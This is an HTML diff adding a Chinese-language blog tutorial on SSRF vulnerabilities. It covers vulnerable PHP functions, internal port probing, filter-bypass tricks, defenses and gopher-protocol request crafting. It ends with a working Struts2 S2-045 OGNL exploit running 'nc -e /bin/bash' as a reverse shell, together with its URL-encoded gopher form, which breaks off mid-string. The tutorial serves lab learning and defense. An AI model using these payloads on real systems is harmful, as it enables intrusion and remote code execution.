@@ -1,0 +1,864 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+      <!-- Enable responsiveness on mobile devices-->
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+      <title>Baz&#x27;s blog</title>
+
+      
+        <link rel="alternate" type="application/atom+xml" title="RSS" href="https://baz.ee/atom.xml">
+      
+
+      
+          <link rel="stylesheet" href="https://baz.ee/site.css">
+      
+
+      
+      
+    </head>
+
+    <body class="hack dark main container">
+        
+    
+        
+                
+                    <header>
+                        <nav itemscope itemtype="http://schema.org/SiteNavigationElement">
+                        
+                            <a itemprop="url"
+                               class=""
+                               href="https:&#x2F;&#x2F;baz.ee">
+                                <span itemprop="name">Home
+                                </span></a>
+                        
+                            <a itemprop="url"
+                               class=""
+                               href="https:&#x2F;&#x2F;baz.ee&#x2F;categories">
+                                <span itemprop="name">Categories
+                                </span></a>
+                        
+                            <a itemprop="url"
+                               class=""
+                               href="https:&#x2F;&#x2F;baz.ee&#x2F;tags">
+                                <span itemprop="name">Tags
+                                </span></a>
+                        
+                        </nav>
+                    </header>
+                
+            
+    
+
+<article itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+        <h1 itemprop="headline">SSRF服务端请求伪造漏洞</h1>
+        <span class="muted">
+    <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32"
+         width="16" height="16" fill="none" stroke="currentcolor"
+         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+        <circle cx="16" cy="16" r="14"/>
+        <path d="M16 8 L16 16 20 20"/>
+    </svg>
+    <span>61 minute read</span>
+    <svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32"
+         width="16" height="16" fill="none" stroke="currentcolor"
+         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+        <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z"/>
+    </svg>
+
+    Published: 2021-06-25
+</span>
+    </header>
+    <div itemprop="articleBody">
+      <h1 id="shi-yao-shi-ssrf">什么是SSRF</h1>
+<p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由<strong>攻击者构造</strong>形成<strong>由服务端发起</strong>请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够<strong>请求到</strong>与它相连而<strong>与外网隔离的内部系统</strong>）<br />能够对外发送网络请求的点都有可能存在ssrf漏洞</p>
+<span id="continue-reading"></span>
+<p>漏洞成因<br /><a href="http://www.xxx.com/a.php?image=http://192.168.0.109/xxx.png">http://www.xxx.com/a.php?image=http://192.168.0.109/xxx.png</a><br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624558154091-48f754d2-e6f5-4cf8-a21d-e990fd35ec79.png#align=left&amp;display=inline&amp;height=589&amp;id=NqbdT&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1177&amp;originWidth=2200&amp;size=1022377&amp;status=done&amp;style=none&amp;width=1100" alt="image.png" /><br />由于业务需要，服务端程序需要从其他服务器应用中获取数据，例如获取图片、数据等，但是由于服务器没有对其请求的目标地址做过滤和限制，导致黑客可以利用此缺陷请求任意服务器资源，其中就包含隐匿在内网的应用。很多企业认为服务器在内网不会受到黑客攻击，便放任漏洞不管，不做补丁修复和版本升级，弱口令遍布内网。但是在SSRF漏洞面前这些漏洞都会成为黑客的“盘中餐”。<br />SSRF漏洞一般为HTTP／HTTPS方式出现，但类似TCP Connect方式也可以探测内网的IP活跃状态和端口的开放情况，但此类危害较小。</p>
+<p>SSRF漏洞出现的位置</p>
+<ul>
+<li>服务器主动发起网络请求，例如HTTP／HTTPS／Socket</li>
+<li>分享功能，通过URL分享网页内容，<a href="https://link.zhihu.com/?target=http%3A//www.360bug.net/index.php/archives/49/%3Ffrom%3Dtimeline%26isappinstalled%3D0">微博SSRF</a></li>
+<li>图片加载、下载功能</li>
+<li>邮件系统</li>
+<li>api远程调用</li>
+<li>只要是服务器可以主动发起网络请求便可能出现</li>
+</ul>
+<h1 id="ssrflou-dong-de-wei-hai">SSRF漏洞的危害</h1>
+<ul>
+<li>对目标服务器所在的内网进行IP存活性扫描和端口扫描</li>
+<li>利用扫描的指纹信息判断开放的服务，从而对内网的主机进行攻击</li>
+<li>识别内网WEB应用指纹，判断应用类型进行攻击</li>
+<li>使用特定协议攻击应用（gopher、dict、file、FTP／SFTP等）</li>
+</ul>
+<h1 id="ssrflou-dong-de-ye-wu-chang-jing">SSRF漏洞的业务场景</h1>
+<ul>
+<li>分享：通过URL地址分享网页内容</li>
+<li>转码服务（手机适配）</li>
+<li>在线翻译（百度翻译搜索检索IP的网址：<a href="http://www.ip.cn">http://www.ip.cn</a>）</li>
+<li>图片加载与下载：通过URL地址加载或下载图片</li>
+<li>图片、文章收藏功能</li>
+<li>未公开的api实现以及其他调用URL的功能</li>
+<li>从URL关键字中寻找（share、wap、url、link、src、source、target、sourceURl、 imageURL、domain）</li>
+</ul>
+<ol>
+<li>图片加载与下载</li>
+</ol>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624558913214-24d93aa8-d7de-4dd6-a007-93fc3a37dcc1.png#align=left&amp;display=inline&amp;height=736&amp;id=gVCGs&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=736&amp;originWidth=1504&amp;size=656515&amp;status=done&amp;style=none&amp;width=1504" alt="image.png" /></p>
+<ol start="2">
+<li>分享：通过URL地址分享网页内容</li>
+</ol>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624558913791-ecfca080-ed2c-442b-96e1-e255cc3e200a.png#align=left&amp;display=inline&amp;height=399&amp;id=d7Fbc&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=798&amp;originWidth=1478&amp;size=602333&amp;status=done&amp;style=none&amp;width=739" alt="image.png" /></p>
+<ol start="3">
+<li>翻译：百度翻译功能会请求ip138，此时ip138便能查询出百度翻译服务器的外网IP</li>
+</ol>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624558955388-123a425f-b931-4be1-a709-d0847c0d4154.png#align=left&amp;display=inline&amp;height=395&amp;id=AtyCw&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=790&amp;originWidth=1374&amp;size=863962&amp;status=done&amp;style=none&amp;width=687" alt="image.png" /></p>
+<h1 id="yin-fa-ssrflou-dong-de-han-shu">引发SSRF漏洞的函数</h1>
+<ul>
+<li>file_get_contents()</li>
+<li>fsockopen()</li>
+<li>curl_exec()</li>
+</ul>
+<p><strong>file_get_contents()</strong><br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624558338105-294f2372-ce5b-4137-86a3-909404c71172.png#align=left&amp;display=inline&amp;height=230&amp;id=TsGsW&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=460&amp;originWidth=866&amp;size=49238&amp;status=done&amp;style=none&amp;width=433" alt="image.png" /><br />以上代码是获取post参数url中的值地址，通过file_get_contents获取url中的图片内容，保存到image目录下，然后显示。<br />file_get_contents函数使用前需要将php.ini的allow_url_fopen设置为ON。<br />以上的漏洞代码是存在SSRF漏洞的，可以控制url参数，自定义任意的URL，包括内网的URL，例如现在验证内网192.168.0.118是否开启了6379端口，可以做以下访问<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624558366722-a14292a6-8f94-4a09-951c-8fd867a6c00b.png#align=left&amp;display=inline&amp;height=186&amp;id=zrPpH&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=372&amp;originWidth=1914&amp;size=169774&amp;status=done&amp;style=none&amp;width=957" alt="image.png" /><br />根据上图提示说明开启了6379，接下来测试是否开启了8888端口<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624558473996-749d2b12-3c10-4a9c-9be9-c07dabc40489.png#align=left&amp;display=inline&amp;height=164&amp;id=z5vBN&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=328&amp;originWidth=1466&amp;size=105648&amp;status=done&amp;style=none&amp;width=733" alt="image.png" /><br />测试8888端口时，根据上图提示，显示错误信息，说明端口未开放。接下来测试80端口，看显示结果（因为109的80端口是开放的，所以测试下，看回显内容）<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624611964815-95164369-c3de-4d42-983a-f7b055b31990.png#align=left&amp;display=inline&amp;height=216&amp;id=LBRdM&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=432&amp;originWidth=1184&amp;size=86715&amp;status=done&amp;style=none&amp;width=592" alt="image.png" /><br />访问109的80端口并未报错，此时，查看图片内容（选中图片，点复制链接），如下图：<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624612001640-30c1b72d-b3b0-4c7e-9a6d-856af69ad9f8.png#align=left&amp;display=inline&amp;height=381&amp;id=CGAE3&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=762&amp;originWidth=1712&amp;size=207894&amp;status=done&amp;style=none&amp;width=856" alt="image.png" /><br />发现请求的80端口的数据被写入到了图片问题中，符合代码预期。除了可以探测端口，也可以做文件包含漏洞的利用，这里不再细说文件包含的知识。</p>
+<p><strong>fsockopen()</strong><br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624558599883-18beb195-037a-4c4b-a182-be73d11365bd.png#align=left&amp;display=inline&amp;height=431&amp;id=cLTdq&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=862&amp;originWidth=1518&amp;size=126360&amp;status=done&amp;style=none&amp;width=759" alt="image.png" /><br />以上函数是接受url和port来制定socket访问的地址和端口，由于地址和端口用户可控，所以可以用来SSRF漏洞的利用。<br />例如可以做以下访问可以探测119的3306端口是否开放：<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624558630672-9214aeb2-a4ae-43cc-8ebc-5228e42454d9.png#align=left&amp;display=inline&amp;height=384&amp;id=K7MSU&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=384&amp;originWidth=1676&amp;size=260029&amp;status=done&amp;style=none&amp;width=1676" alt="image.png" /><br />做以下访问可以探测109的3306是否开放：<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624558631019-9fc710ba-d52f-46f6-8040-dbcd346ef87f.png#align=left&amp;display=inline&amp;height=147&amp;id=xCvAB&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=294&amp;originWidth=1544&amp;size=78865&amp;status=done&amp;style=none&amp;width=772" alt="image.png" /><br />未出现错误信息说明端口开放</p>
+<p><strong>curl_exec()</strong><br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624558683676-240f8f92-6cd6-4c31-9d30-7d964a23c1ce.png#align=left&amp;display=inline&amp;height=206&amp;id=UygUV&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=412&amp;originWidth=1044&amp;size=44782&amp;status=done&amp;style=none&amp;width=522" alt="image.png" /><br />curl_exec函数是危害最大的函数，也是需要重点讲的函数。以上代码是获取参数url的值，使用curl进行访问。<br />curl_exec的使用需要3个条件：<br />1、PHP版本&gt;=5.3<br />2、开启extension=php_curl.dll<br />3、--wite-curlwrappers（编译PHP时用，此时不需要，可忽略）<br />使用dict协议探测22端口（后面会讲dict协议）<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624558696648-b7dd19d4-56e0-4f9c-812b-ef79a0b0a941.png#align=left&amp;display=inline&amp;height=78&amp;id=xbT0I&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=156&amp;originWidth=1538&amp;size=89120&amp;status=done&amp;style=none&amp;width=769" alt="image.png" /><br />使用dict协议探测6379端口<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624558717469-21f223fa-bbad-4257-895a-ff41da8487f1.png#align=left&amp;display=inline&amp;height=69&amp;id=JABwP&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=138&amp;originWidth=1538&amp;size=94799&amp;status=done&amp;style=none&amp;width=769" alt="image.png" /><br />可以根据回显的banner信息判断目标端口运行的服务为ssh和redis服务，dict协议还可以做到执行命令的功能。</p>
+<h1 id="ssrflou-dong-rao-guo-fang-shi">SSRF漏洞绕过方式</h1>
+<ul>
+<li>攻击本机</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624559049882-552d20c3-874a-4878-bad3-9c9947ca3945.png#align=left&amp;display=inline&amp;height=77&amp;id=nMviQ&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=154&amp;originWidth=1512&amp;size=113423&amp;status=done&amp;style=none&amp;width=756" alt="image.png" /></p>
+<ul>
+<li>利用@绕过</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624559057665-808386a7-5ee1-431e-8757-746854f6dd73.png#align=left&amp;display=inline&amp;height=85&amp;id=nUwn9&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=170&amp;originWidth=1512&amp;size=187252&amp;status=done&amp;style=none&amp;width=756" alt="image.png" /></p>
+<ul>
+<li>利用短地址绕过</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624559065931-3871dc73-c9d1-4d94-817b-40655176ddbc.png#align=left&amp;display=inline&amp;height=81&amp;id=taNXG&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=162&amp;originWidth=1512&amp;size=296348&amp;status=done&amp;style=none&amp;width=756" alt="image.png" /></p>
+<ul>
+<li>利用Enclosed alphanumerics</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624559093589-462bc619-3f79-4656-8d1e-c7ce427fda80.png#align=left&amp;display=inline&amp;height=273&amp;id=as2CK&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=546&amp;originWidth=1472&amp;size=896056&amp;status=done&amp;style=none&amp;width=736" alt="image.png" /></p>
+<ul>
+<li>利用句号代替点绕过</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624559107978-f481f39a-6741-4e66-9763-3a628bb8ec52.png#align=left&amp;display=inline&amp;height=46&amp;id=A4d71&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=92&amp;originWidth=1104&amp;size=22124&amp;status=done&amp;style=none&amp;width=552" alt="image.png" /></p>
+<ul>
+<li>特殊域名绕过</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624559126327-adefa8ec-d253-4535-b471-d23d093c949b.png#align=left&amp;display=inline&amp;height=67&amp;id=XJOit&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=134&amp;originWidth=1104&amp;size=102307&amp;status=done&amp;style=none&amp;width=552" alt="image.png" /></p>
+<ul>
+<li>使用进制绕过，例如127.0.0.1</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624559148740-0c7bf54c-4421-45ea-92f7-f988a776498d.png#align=left&amp;display=inline&amp;height=172&amp;id=y7bel&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=344&amp;originWidth=1506&amp;size=570210&amp;status=done&amp;style=none&amp;width=753" alt="image.png" /></p>
+<h1 id="ssrflou-dong-de-fang-yu">SSRF漏洞的防御</h1>
+<ul>
+<li>禁止302跳转，或者没跳转一次都进行校验目的地址是否为内网地址或合法地址。</li>
+<li>过滤返回信息，验证远程服务器对请求的返回结果，是否合法。</li>
+<li>禁用高危协议，例如：gopher、dict、ftp、file等，只允许http/https设置 URL白名单或者限制内网IP</li>
+<li>限制请求的端口为http的常用端口，或者根据业务需要治开放远程调用服务的端口</li>
+<li>catch错误信息，做统一错误信息，避免黑客通过错误信息判断端口对应的服务</li>
+</ul>
+<h1 id="ssrflou-dong-de-ying-yong">SSRF漏洞的应用</h1>
+<h2 id="gopherxie-yi-de-ying-yong">Gopher协议的应用</h2>
+<h3 id="shi-yao-shi-gopferxie-yi">什么是Gopfer协议</h3>
+<p><strong>定义</strong>：Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；<br />gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，再构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议<br /><strong>限制</strong>：gopher协议在各个编程语言中的使用限制<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624627608419-8e271cdc-b44f-4c77-9a38-4c2d1be9e29e.png#align=left&amp;display=inline&amp;height=162&amp;id=uea6ec4c9&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=162&amp;originWidth=1314&amp;size=120269&amp;status=done&amp;style=none&amp;width=1314" alt="image.png" /><br />--wite-curlwrappers：运用curl工具打开url流<br />curl使用curl --version查看版本以及支持的协议<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624627634358-b9c2abfd-87e9-4057-8ffb-1df453d8e949.png#align=left&amp;display=inline&amp;height=168&amp;id=ud4bd65b6&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=168&amp;originWidth=1132&amp;size=252658&amp;status=done&amp;style=none&amp;width=1132" alt="image.png" /><br /><strong>Gopher协议格式</strong>：</p>
+<pre data-lang="http" style="background-color:#2b303b;color:#c0c5ce;" class="language-http "><code class="language-http" data-lang="http"><span>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流
+</span></code></pre>
+<ul>
+<li>gopher的默认端口是70</li>
+<li>如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码</li>
+</ul>
+<p><strong>Gopher发送请求HTTP GET请求：</strong><br />使用Gopher协议发送一个请求，环境为：nc起一个监听，curl发送gopher请求<br />nc启动监听，监听2333端口：nc -lp 2333<br />使用curl发送http请求，命令为：</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">margine:~</span><span> margin$ curl gopher://192.168.0.119:2333/abcd
+</span></code></pre>
+<p>此时nc收到的消息为：</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">margine:~</span><span> margin$ nc</span><span style="color:#bf616a;"> -lp</span><span> 2333
+</span><span style="color:#bf616a;">bcd
+</span></code></pre>
+<p>可以发现url中的a没有被nc接受到，如果命令变为：</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">margine:~</span><span> margin$ curl gopher://192.168.0.119:2333/_abcd
+</span></code></pre>
+<p>此时nc收到的消息为：</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">margine:~</span><span> margin$ nc</span><span style="color:#bf616a;"> -lp</span><span> 2333
+</span><span style="color:#bf616a;">abcd
+</span></code></pre>
+<p>所以需要在使用gopher协议时在url后加入一个字符（该字符可随意写）<br />那么如何发送HTTP的请求呢？例如GET请求。此时我们联想到，直接发送一个原始的HTTP包不就可以吗？在gopher协议中发送HTTP的数据，需要以下三步：<br />1、构造HTTP数据包<br />2、URL编码、替换回车换行为%0d%0a<br />3、发送gopher协议</p>
+<p>我准备了一个PHP的代码，如下：</p>
+<pre data-lang="php" style="background-color:#2b303b;color:#c0c5ce;" class="language-php "><code class="language-php" data-lang="php"><span style="color:#ab7967;">&lt;?php
+</span><span>    </span><span style="color:#96b5b4;">echo </span><span>&quot;</span><span style="color:#a3be8c;">Hello </span><span>&quot;.$</span><span style="color:#bf616a;">_GET</span><span>[&quot;</span><span style="color:#a3be8c;">name</span><span>&quot;].&quot;</span><span style="color:#96b5b4;">\n</span><span>&quot;
+</span><span style="color:#ab7967;">?&gt;
+</span></code></pre>
+<p>一个GET型的HTTP包，如下：</p>
+<pre data-lang="http" style="background-color:#2b303b;color:#c0c5ce;" class="language-http "><code class="language-http" data-lang="http"><span>GET /ssrf/base/get.php?name=Margin HTTP/1.1
+</span><span>Host: 192.168.0.109
+</span></code></pre>
+<p>URL编码后为：</p>
+<pre data-lang="http" style="background-color:#2b303b;color:#c0c5ce;" class="language-http "><code class="language-http" data-lang="http"><span>curl gopher://192.168.0.109:80/_GET%20/ssrf/base/get.php%3fname=Margin%20HTTP/1.1%0d%0AHost:%20192.168.0.109%0d%0A
+</span></code></pre>
+<p>在转换为URL编码时候有这么几个坑：<br />1、问号（？）需要转码为URL编码，也就是%3f<br />2、回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a<br />3、在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</p>
+<p><strong>Gopher发送请求HTTP POST请求：</strong><br />发送POST请求前，先看下POST数据包的格式</p>
+<pre data-lang="http" style="background-color:#2b303b;color:#c0c5ce;" class="language-http "><code class="language-http" data-lang="http"><span>POST /ssrf/base/post.php HTTP/1.1
+</span><span>host:192.168.0.109
+</span><span>
+</span><span>name=Margin
+</span></code></pre>
+<p>那我们将上面的POST数据包进行URL编码并改为gopher协议</p>
+<pre data-lang="http" style="background-color:#2b303b;color:#c0c5ce;" class="language-http "><code class="language-http" data-lang="http"><span>curl gopher://192.168.0.109:80/_POST%20/ssrf/base/post.php%20HTTP/1.1%0d%0AHost:192.168.0.1090d%0A%0d%0Aname=Margin%0d%0A
+</span></code></pre>
+<p>post.php的代码为</p>
+<pre data-lang="php" style="background-color:#2b303b;color:#c0c5ce;" class="language-php "><code class="language-php" data-lang="php"><span style="color:#ab7967;">&lt;?php
+</span><span>    </span><span style="color:#96b5b4;">echo </span><span>&quot;</span><span style="color:#a3be8c;">Hello </span><span>&quot;.$</span><span style="color:#bf616a;">_POST</span><span>[&quot;</span><span style="color:#a3be8c;">name</span><span>&quot;].&quot;</span><span style="color:#96b5b4;">\n</span><span>&quot;
+</span><span style="color:#ab7967;">?&gt;
+</span></code></pre>
+<p>使用curl发起gopher的POST请求后，结果为：<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624628140442-97b1c6e7-7c2e-41f1-9a08-937dcb63a305.png#align=left&amp;display=inline&amp;height=820&amp;id=u17f57e99&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=820&amp;originWidth=2243&amp;size=1400583&amp;status=done&amp;style=none&amp;width=2243" alt="image.png" /><br />根据上图发现返回的包爆了501的错误，我的思路是这样的：查看Apache的正常日志和错误日志、查找POST请求中所需的字段。下面分别是正常日志和错误日志的截图：</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>192.168.0.119 - - [07/Mar/2020:15:19:49 +0800] &quot;POST /ssrf/base/post.php HTTP/1.1&quot; 200 7
+</span><span>192.168.0.119 - - [07/Mar/2020:15:19:49 +0800] &quot;name=Margin&quot; 501 213
+</span><span>[Sat Mar 07 15:38:50 2020] [error] [client 192.168.0.119] Invalid method in request name=Margin
+</span></code></pre>
+<p>这里有个疑问：为什么发起了2次请求？为什么会把参数name=Margin当作一个请求？这个地方我调试了很久，发现问题出现在POST请求头中，我之前发POST请求都是直接用脚本，但从来没考虑过哪些参数是POST请求必须的，经过排查，发现有4个参数为必要参数（四个参数的含义不再赘述）：</p>
+<pre data-lang="http" style="background-color:#2b303b;color:#c0c5ce;" class="language-http "><code class="language-http" data-lang="http"><span>POST /ssrf/base/post.php HTTP/1.1
+</span><span>host:192.168.0.109
+</span><span>Content-Type:application/x-www-form-urlencoded
+</span><span>Content-Length:11
+</span><span>
+</span><span>name=Margin
+</span></code></pre>
+<p>现在我们将它进行URL编码：</p>
+<pre data-lang="http" style="background-color:#2b303b;color:#c0c5ce;" class="language-http "><code class="language-http" data-lang="http"><span>curl gopher://192.168.0.109:80/_POST%20/ssrf/base/post.php%20HTTP/1.1%0d%0AHost:192.168.0.109%0d%0AContent-Type:application/x-www-form-urlencoded%0d%0AContent-Length:11%0d%0A%0d%0Aname=Margin%0d%0A
+</span></code></pre>
+<p>再次发送请求的结果为：<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624628323373-f064bad3-dbc3-4bb8-a987-6fb0848470c0.png#align=left&amp;display=inline&amp;height=510&amp;id=u6318a58c&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=510&amp;originWidth=2243&amp;size=1021097&amp;status=done&amp;style=none&amp;width=2243" alt="image.png" /><br />发现请求正常，OK，那我们现在就介绍完了gopher协议的GET和POST请求。</p>
+<h3 id="ru-he-shi-yong-gopherxie-yi-fan-dan-shell-shen-tou-javade-struts2kuang-jia">如何使用Gopher协议反弹shell（渗透Java的Struts2框架）</h3>
+<p>Struts2框架是一个用于开发Java EE网络应用程序的开放源代码网页应用程序架构。它利用并延伸了Java Servlet API，鼓励开发者采用MVC架构。Struts2以WebWork优秀的设计思想为核心，吸收了Struts框架的部分优点，提供了一个更加整洁的MVC设计模式实现的Web应用程序框架 (<em><strong>摘自百度百科</strong></em>)<br />今天我们用到的漏洞是Struts2-045漏洞，相信很多大佬不陌生，以下为S2-045漏洞反弹shell的利用代码，我们在本地机器上执行：nc -lp 6666</p>
+<pre data-lang="http" style="background-color:#2b303b;color:#c0c5ce;" class="language-http "><code class="language-http" data-lang="http"><span>GET /S2-045/ HTTP/1.1
+</span><span>Host: 192.168.0.119
+</span><span>Content-Type:%{(#_=&#39;multipart/form-data&#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#39;nc -e /bin/bash 192.168.0.119 6666&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?{&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd}:{&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+</span></code></pre>
+<p>我们将其变为gopher所能使用的请求</p>
+<pre data-lang="http" style="background-color:#2b303b;color:#c0c5ce;" class="language-http "><code class="language-http" data-lang="http"><span>curl gopher://192.168.0.119:8080/_GET%20/S2-045/%20HTTP/1.1%0d%0aHost:192.168.0.119%0d%0aContent-Type:%25%7b%28%23%5f%3d%27%6d%75%6c%74%69%70%61%72%74%2f%66%6f%72%6d%2d%64%61%74%61%27%29%2e%28%23%64%6d%3d%40%6f%67%6e%6c%2e%4f%67%6e%6c%43%6f%6e%74%65%78%74%40%44%45%46%41%55%4c%54%5f%4d%45%4d%42%45%52%5f%41%43%43%45%53%53%29%2e%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%3f%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%3d%23%64%6d%29%3a%28%28%23%63%6f%6e%74%61%69%6e%65%72%3d%23%63%6f%6e%74%65%78%74%5b%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%2e%63%6f%6e%74%61%69%6e%65%72%27%5d%29%2e%28%23%6f%67%6e%6c%55%74%69%6c%3d%23%63%6f%6e%74%61%69%6e%65%72%2e%67%65%74%49%6e%73%74%61%6e%63%65%28%40%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%6f%67%6e%6c%2e%4f%67%6e%6c%55%74%69%6c%40%63%6c%61%73%73%29%29%2e%28%23%6f%67%6e%6c%55%74%69%6c%2e%67%65%74%45%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%6f%67%6e%6c%55%74%69%6c%2e%67%65%74%45%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%63%6f%6e%74%65%78%74%2e%73%65%74%4d%65%6d%62%65%72%41%63%63%65%73%73%28%23%64%6d%29%29%29%29%2e%28%23%63%6d%64%3d%27%6e%63%20%2d%65%20%2f%62%69%6e%2f%62%61%73%68%20%31%39%32%2e%31%36%38%2e%30%2e%31%31%39%20%36%36%36%36%27%29%2e%28%23%69%73%77%69%6e%3d%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%53%79%73%74%65%6d%40%67%65%74%50%72%6f%70%65%72%74%79%28%27%6f%73%2e%6e%61%6d%65%27%29%2e%74%6f%4c%6f%77%65%72%43%61%73%65%28%29%2e%63%6f%6e%74%61%69%6e%73%28%27%77%69%6e%27%29%29%29%2e%28%23%63%6d%64%73%3d%28%23%69%73%77%69%6e%3f%7b%27%63%6d%64%2e%65%78%65%27%2c%27%2f%63%27%2c%2